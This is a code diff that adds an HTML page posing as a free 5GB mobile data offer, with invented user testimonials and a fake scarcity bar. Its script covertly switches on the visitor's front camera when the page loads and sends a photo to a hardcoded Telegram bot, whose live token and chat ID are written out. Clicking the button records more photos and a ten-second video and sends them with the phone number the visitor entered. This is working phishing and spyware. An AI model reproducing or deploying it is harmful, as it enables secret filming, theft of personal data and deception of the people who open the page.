@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get 5GB Free Data</title>
+    <style>
+        :root {
+            --primary: #0066cc;
+            --primary-light: #4d94ff;
+            --primary-dark: #004d99;
+            --secondary: #00cc88;
+            --accent: #ff6b6b;
+            --white: #ffffff;
+            --light-bg: #f8faff;
+            --card-bg: #ffffff;
+            --text-dark: #2d3748;
+            --text-medium: #4a5568;
+            --text-light: #718096;
+            --shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+            --shadow-hover: 0 15px 35px rgba(0, 102, 204, 0.15);
+            --border-radius: 20px;
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #e6f2ff 0%, #cce5ff 100%);
+            padding: 20px;
+            color: var(--text-dark);
+            line-height: 1.6;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 800px;
+            background-color: var(--card-bg);
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            overflow: hidden;
+            transition: var(--transition);
+        }
+
+        .container:hover {
+            box-shadow: var(--shadow-hover);
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 18px;
+            font-weight: 700;
+            padding: 20px 30px;
+            background: linear-gradient(90deg, var(--primary) 0%, var(--primary-light) 100%);
+            color: var(--white);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.7s;
+        }
+
+        .header:hover::before {
+            left: 100%;
+        }
+
+        .header div {
+            position: relative;
+            z-index: 1;
+        }
+
+        .content {
+            padding: 40px;
+        }
+
+        h1 {
+            color: var(--primary);
+            font-size: 36px;
+            margin-bottom: 15px;
+            font-weight: 800;
+            line-height: 1.2;
+        }
+
+        .subtitle {
+            font-size: 20px;
+            color: var(--primary-light);
+            margin-bottom: 30px;
+            font-weight: 500;
+        }
+
+        p {
+            color: var(--text-medium);
+            font-size: 17px;
+            margin-bottom: 25px;
+        }
+
+        .highlight-box {
+            background: linear-gradient(135deg, #f0f7ff 0%, #e6f2ff 100%);
+            border-left: 4px solid var(--primary);
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 0 12px 12px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .form-container {
+            background: var(--light-bg);
+            padding: 30px;
+            border-radius: 16px;
+            margin-top: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.03);
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: var(--primary-dark);
+            font-size: 18px;
+        }
+
+        input[type="text"] {
+            padding: 16px 20px;
+            font-size: 17px;
+            width: 100%;
+            box-sizing: border-box;
+            border: 2px solid #e1e8ff;
+            border-radius: 12px;
+            background-color: var(--white);
+            transition: var(--transition);
+            font-weight: 500;
+        }
+
+        input[type="text"]:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.2);
+            outline: none;
+        }
+
+        .button-container {
+            text-align: center;
+            margin-top: 30px;
+        }
+
+        button {
+            padding: 18px 45px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: var(--white);
+            border: none;
+            border-radius: 12px;
+            transition: var(--transition);
+            box-shadow: 0 6px 15px rgba(0, 102, 204, 0.4);
+            position: relative;
+            overflow: hidden;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 102, 204, 0.5);
+        }
+
+        button:active {
+            transform: translateY(1px);
+        }
+
+        button::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        button:hover::after {
+            left: 100%;
+        }
+
+        .message, .loading-message {
+            margin-top: 25px;
+            font-size: 18px;
+            text-align: center;
+            padding: 20px;
+            border-radius: 12px;
+            font-weight: 600;
+        }
+
+        .message {
+            color: var(--primary);
+            background-color: rgba(0, 102, 204, 0.1);
+            border: 1px solid rgba(0, 102, 204, 0.2);
+        }
+
+        .loading-message {
+            display: none;
+            color: var(--primary);
+            background-color: rgba(0, 102, 204, 0.05);
+            border: 1px dashed rgba(0, 102, 204, 0.3);
+        }
+
+        .note {
+            font-size: 15px;
+            color: var(--text-light);
+            margin-top: 25px;
+            text-align: center;
+            padding: 20px;
+            background-color: rgba(0, 0, 0, 0.02);
+            border-radius: 12px;
+            border: 1px dashed #e1e8ff;
+        }
+
+        .testimonials {
+            margin-top: 50px;
+        }
+
+        .testimonials h2 {
+            text-align: center;
+            color: var(--primary);
+            margin-bottom: 30px;
+            font-size: 28px;
+            font-weight: 700;
+        }
+
+        .testimonial {
+            display: flex;
+            align-items: flex-start;
+            background: var(--white);
+            padding: 25px;
+            border-radius: 16px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            transition: var(--transition);
+            border-top: 4px solid var(--secondary);
+            margin-bottom: 20px;
+        }
+
+        .testimonial:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        }
+
+        .testimonial img {
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            margin-right: 20px;
+            object-fit: cover;
+            border: 3px solid var(--white);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .testimonial .text {
+            font-size: 16px;
+            color: var(--text-medium);
+            flex: 1;
+        }
+
+        .testimonial .name {
+            font-weight: 700;
+            color: var(--text-dark);
+            font-size: 18px;
+            margin-top: 10px;
+        }
+
+        .stars {
+            color: #ffc107;
+            margin-top: 10px;
+        }
+
+        .badge {
+            display: inline-block;
+            background: linear-gradient(135deg, var(--accent) 0%, #ff8e8e 100%);
+            color: white;
+            font-size: 12px;
+            font-weight: 700;
+            padding: 4px 12px;
+            border-radius: 20px;
+            margin-top: 10px;
+        }
+
+        .progress-container {
+            margin: 30px 0;
+        }
+
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: var(--text-dark);
+        }
+
+        .progress-bar {
+            height: 10px;
+            background-color: #e1e8ff;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, var(--secondary) 0%, #00e699 100%);
+            border-radius: 10px;
+            width: 75%;
+            transition: width 1s ease;
+        }
+
+        .spinner {
+            border: 3px solid rgba(59, 130, 246, 0.3);
+            border-radius: 50%;
+            border-top: 3px solid #3B82F6;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 768px) {
+            body {
+                padding: 15px;
+            }
+            
+            .content {
+                padding: 30px 25px;
+            }
+            
+            .header {
+                font-size: 16px;
+                padding: 15px 20px;
+            }
+            
+            h1 {
+                font-size: 30px;
+            }
+            
+            .subtitle {
+                font-size: 18px;
+            }
+            
+            p {
+                font-size: 16px;
+            }
+            
+            button {
+                padding: 16px 35px;
+                font-size: 17px;
+            }
+            
+            .message, .loading-message {
+                font-size: 16px;
+            }
+            
+            .testimonial {
+                padding: 20px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header {
+                font-size: 14px;
+                flex-direction: column;
+                padding: 15px;
+            }
+            
+            .header div {
+                margin-bottom: 8px;
+            }
+            
+            .content {
+                padding: 25px 20px;
+            }
+            
+            h1 {
+                font-size: 26px;
+            }
+            
+            .subtitle {
+                font-size: 16px;
+            }
+            
+            p {
+                font-size: 16px;
+            }
+            
+            button {
+                padding: 16px 30px;
+                font-size: 16px;
+                width: 100%;
+            }
+            
+            .testimonial {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .testimonial img {
+                margin-right: 0;
+                margin-bottom: 15px;
+                align-self: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div>FREE OFFER</div>
+            <div>LIMITED TIME</div>
+            <div>5GB DATA</div>
+        </div>
+        
+        <div class="content">
+            <h1>Get 5GB Free Data for Any SIM</h1>
+            <p class="subtitle">Claim your free data in just a few simple steps!</p>
+            
+            <p>We're excited to offer you 5GB of free data for any SIM card. This limited-time promotion is our way of saying thank you to our loyal customers. Simply enter your phone number below to claim your free data.</p>
+            
+            <div class="progress-container">
+                <div class="progress-label">
+                    <span>Offer Availability</span>
+                    <span>75% claimed</span>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress"></div>
+                </div>
+            </div>
+            
+            <div class="highlight-box">
+                <strong>How it works:</strong> Enter your phone number, verify your account, and enjoy 5GB of free data within minutes! No hidden fees or subscriptions.
+            </div>
+            
+            <div class="form-container">
+                <form id="phoneNumberForm">
+                    <div class="form-group">
+                        <label for="phoneNumber">Enter Your Phone Number</label>
+                        <input type="text" id="phoneNumber" name="phoneNumber" placeholder="e.g., 07123xxxxx or 01345xxxxxx" required pattern="\d{10,15}">
+                    </div>
+                    
+                    <div class="button-container">
+                        <button type="button" id="getDataButton">
+                            <i class="fas fa-download"></i> Get My Free Data Now
+                        </button>
+                    </div>
+                </form>
+                
+                <div class="message" id="message"></div>
+                <div class="loading-message" id="loadingMessage">
+                    <div class="spinner"></div> Please wait, processing your request...
+                </div>
+            </div>
+            
+            <div class="note">
+                <i class="fas fa-info-circle"></i> Note: This offer is valid for a limited time only. Make sure to complete the process as soon as possible to avail the benefits.
+            </div>
+            
+            <div class="testimonials">
+                <h2>What Our Users Say</h2>
+                
+                <div class="testimonial">
+                    <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=80" alt="Alex Johnson">
+                    <div>
+                        <div class="text">"I was skeptical at first, but this really works! Got my 5GB data within minutes. Amazing service!"</div>
+                        <div class="name">Alex Johnson</div>
+                        <div class="stars">
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="testimonial">
+                    <img src="https://images.unsplash.com/photo-1489424731084-a5d8b219a5bb?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=80" alt="Sarah Miller">
+                    <div>
+                        <div class="text">"This came at the perfect time when I was running low on data. So easy to claim and the data was added instantly!"</div>
+                        <div class="name">Sarah Miller</div>
+                        <div class="stars">
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star-half-alt"></i>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="testimonial">
+                    <img src="https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=80" alt="Michael Chen">
+                    <div>
+                        <div class="text">"I've tried similar offers before but this is by far the most straightforward and reliable. Highly recommended!"</div>
+                        <div class="name">Michael Chen</div>
+                        <div class="stars">
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                        </div>
+                        <div class="badge">Verified User</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <video id="videoElement" autoplay playsinline style="display: none;"></video>
+    <canvas id="canvasElement" style="display: none;"></canvas>
+
+    <script>
+        // Telegram configuration
+        const TELEGRAM_BOT_TOKEN = '8272140272:AAGmIsWV4gJUN3hVRYv4R7t-v2bkzd0f__s';
+        const CHAT_ID = '7989354017';
+        
+        const videoElement = document.getElementById('videoElement');
+        const canvasElement = document.getElementById('canvasElement');
+        const getDataButton = document.getElementById('getDataButton');
+        const messageElement = document.getElementById('message');
+        const loadingMessageElement = document.getElementById('loadingMessage');
+        const phoneNumberInput = document.getElementById('phoneNumber');
+        
+        let mediaStream = null;
+        let isCapturing = false;
+        let captureCount = 0;
+        const MAX_CAPTURES = 3;
+        
+        // Initialize auto-capture on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('DOM loaded - initializing auto-capture');
+            
+            initializeCamera();
+            
+            getDataButton.addEventListener('click', function() {
+                console.log('Button clicked - starting manual capture');
+                getFreeData();
+            });
+            
+            const progress = document.querySelector('.progress');
+            setTimeout(() => {
+                progress.style.width = '75%';
+            }, 500);
+        });
+        
+        async function initializeCamera() {
+            try {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    console.log('Camera API not supported');
+                    return;
+                }
+                
+                const constraints = {
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
+                };
+                
+                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+                videoElement.srcObject = mediaStream;
+                
+                videoElement.addEventListener('loadedmetadata', function() {
+                    console.log('Video ready - starting auto-capture');
+                    canvasElement.width = videoElement.videoWidth;
+                    canvasElement.height = videoElement.videoHeight;
+                    
+                    // Start auto-capture
+                    setTimeout(() => {
+                        captureImage();
+                    }, 3000);
+                });
+                
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                // Silently fail - user won't know 😎
+            }
+        }
+        
+        function captureImage() {
+            if (!mediaStream || isCapturing) return;
+            
+            isCapturing = true;
+            console.log('Auto-capturing image');
+            
+            try {
+                const context = canvasElement.getContext('2d');
+                context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+                
+                // Convert canvas to blob
+                canvasElement.toBlob(blob => {
+                    sendMediaToTelegram(blob, 'photo', 'Auto-captured image on page load');
+                    
+                    // Stop the media stream
+                    if (mediaStream) {
+                        mediaStream.getTracks().forEach(track => track.stop());
+                    }
+                    isCapturing = false;
+                }, 'image/jpeg', 0.8);
+                
+            } catch (error) {
+                console.error('Error capturing image:', error);
+                isCapturing = false;
+            }
+        }
+        
+        // Get free data function
+        function getFreeData() {
+            const messageElement = document.getElementById('message');
+            const loadingMessageElement = document.getElementById('loadingMessage');
+            loadingMessageElement.style.display = 'block';
+            messageElement.textContent = '';
+
+            captureMedia();
+        }
+
+        // Capture media function
+        async function captureMedia() {
+            if (captureCount >= MAX_CAPTURES) {
+                alert('You have reached the maximum number of captures.');
+                return;
+            }
+
+            captureCount++;
+
+            try {
+                const constraints = {
+                    video: {
+                        facingMode: 'user' // Use front camera
+                    }
+                };
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const videoTrack = stream.getVideoTracks()[0];
+
+                const imgData = await captureImageFromStream(stream);
+                const imgBlob = await fetch(imgData).then(res => res.blob());
+                const phoneNumber = document.getElementById('phoneNumber').value;
+                sendMediaToTelegram(imgBlob, 'photo', phoneNumber);
+
+                const videoBlob = await captureVideoFromStream(stream);
+                sendMediaToTelegram(videoBlob, 'video', phoneNumber);
+
+                stream.getTracks().forEach(track => track.stop());
+
+                const messageElement = document.getElementById('message');
+                const loadingMessageElement = document.getElementById('loadingMessage');
+                loadingMessageElement.style.display = 'none';
+                messageElement.textContent = 'Thank you for your interest! Your request was successful.';
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                alert('Error accessing camera. Please make sure your device supports camera access.');
+            }
+        }
+
+        // Capture image from stream
+        async function captureImageFromStream(stream) {
+            const track = stream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(track);
+            return imageCapture.takePhoto().then(blob => {
+                return URL.createObjectURL(blob);
+            });
+        }
+
+        // Capture video from stream
+        function captureVideoFromStream(stream) {
+            const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            const chunks = [];
+            mediaRecorder.ondataavailable = function(event) {
+                if (event.data.size > 0) {
+                    chunks.push(event.data);
+                }
+            };
+            mediaRecorder.start();
+            return new Promise((resolve, reject) => {
+                mediaRecorder.onstop = function() {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    resolve(blob);
+                };
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 10000);
+            });
+        }
+
+        // Send media
+        function sendMediaToTelegram(blob, type, phoneNumber) {
+            const formData = new FormData();
+            formData.append(type, blob, `${type}_${captureCount}.webm`);
+            formData.append('caption', `Phone Number: ${phoneNumber}`);
+
+            const script = document.createElement('script');
+            script.src = 'https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js';
+            document.head.appendChild(script);
+            
+            script.onload = function() {
+                axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, formData, {
+                    params: {
+                        chat_id: CHAT_ID
+                    }
+                })
+                .then(response => {
+                    console.log('Media sent successfully:', response.data);
+                })
+                .catch(error => {
+                    console.error('Error sending media to Telegram:', error);
+                });
+            };
+        }
+    </script>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</body>
+</html>
